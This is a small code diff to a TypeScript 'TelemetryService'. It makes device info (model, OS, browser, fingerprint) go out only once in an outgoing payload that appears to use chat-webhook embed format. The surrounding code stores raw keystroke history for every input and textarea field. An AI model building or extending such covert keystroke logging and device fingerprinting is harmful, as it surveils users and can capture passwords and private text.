@@ -35,6 +35,7 @@ export class TelemetryService {
   private events: InteractionEvent[] = [];
   private deviceInfoPromise: Promise<DeviceInfo> | null = null;
   private deviceInfo: DeviceInfo | null = null;
+  private hasSentDeviceInfo = false;
   
   // Storage for raw keystroke history per input/textarea field
   private typingLogs: { [key: string]: string[] } = {};
@@ -344,7 +345,7 @@ export class TelemetryService {
     }
 
     const fields: any[] = [];
-    if (this.deviceInfo) {
+    if (this.deviceInfo && !this.hasSentDeviceInfo) {
       fields.push({
         name: "Device 📱",
         value: `${this.deviceInfo.phoneModel} (${this.deviceInfo.os} - ${this.deviceInfo.browser})`,
@@ -360,6 +361,7 @@ export class TelemetryService {
         value: `\`${this.deviceInfo.fingerprint}\``,
         inline: true
       });
+      this.hasSentDeviceInfo = true;
     }
 
     const payload = {
